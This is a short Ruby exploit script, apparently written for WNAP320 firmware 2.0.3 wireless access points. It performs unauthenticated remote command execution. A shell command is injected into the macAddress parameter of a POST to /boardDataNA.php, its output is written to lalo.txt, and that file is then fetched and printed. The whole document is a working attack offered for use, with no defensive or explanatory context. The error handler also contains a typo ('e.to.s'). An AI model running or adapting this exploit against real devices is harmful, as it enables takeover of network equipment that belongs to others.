#!/usr/bin/env ruby
# WNAP320 Firmware Version 2.0.3.zip
require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || 'uname -a'

def usage
 puts '[*] <host> [cmd]'
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = 65535, 
                                    context = {}, 
                                    ssl = false)


data = "macAddress=005056c00008;#{cmd} >lalo.txt #&reginfo=0&writeData=Submit"

req = sock.request_cgi(
 {
  'uri'     => "/boardDataNA.php",
  'version' => '1.0',
  'method'  => 'POST',
  'data'    => data,
 })

sock.send_request(req)
recv = sock.read_response()

if recv and recv.code == 200
 req = sock.request_raw({'uri' => '/lalo.txt'})
 sock.send_request(req)
 recv = sock.read_response()
 puts recv.body
else
 puts "[!] Failed..."
end

rescue => e
puts "[!] #{e.to.s}"
end
